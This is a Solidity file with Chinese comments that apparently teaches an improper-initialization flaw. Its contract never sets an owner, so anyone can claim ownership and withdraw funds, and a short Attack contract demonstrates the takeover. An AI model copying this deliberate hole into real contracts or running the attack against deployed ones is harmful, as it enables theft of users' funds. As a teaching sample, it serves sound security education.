/*
漏洞名稱: Improper Declaration or Initialization
描述:
合約中的關鍵資源（如 owner）在初始化時不正確，導致合約部署後，任何人皆可取得權限，進行未授權操作。

以下為有漏洞的範例程式碼，包含攻擊示範：
*/

contract VulnerableContract {
    // 漏洞重點部位: owner 未在合約部署時正確初始化，預設為 address(0)，致使任何人皆能呼叫 becomeOwner() 取得權限
    address public owner;

    // constructor 未正確初始化 owner
    constructor() {
        // 錯誤示範: 沒有將 owner 設為合約部署者
    }

    // 攻擊入口: 任意人皆可呼叫此函數成為 owner
    function becomeOwner() public {
        // 漏洞: 若 owner 尚未被設定 (即為 address(0))，任何人皆可呼叫將 owner 設為 msg.sender
        if (owner == address(0)) {
            owner = msg.sender;
        }
    }

    // 範例功能: 存款
    function deposit() public payable {}

    // 範例功能: 提款，只有 owner 可執行
    function withdraw(uint amount) public {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(amount);
    }
}

// 最小可行攻擊範例，攻擊者可透過此合約取得 VulnerableContract 的 owner 權限
contract Attack {
    VulnerableContract public vulnerable;

    // 部署 Attack 合約時需傳入 VulnerableContract 的地址
    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    // 攻擊流程: 呼叫 becomeOwner() 將自己設為 owner
    function attack() public {
        vulnerable.becomeOwner();
    }
}
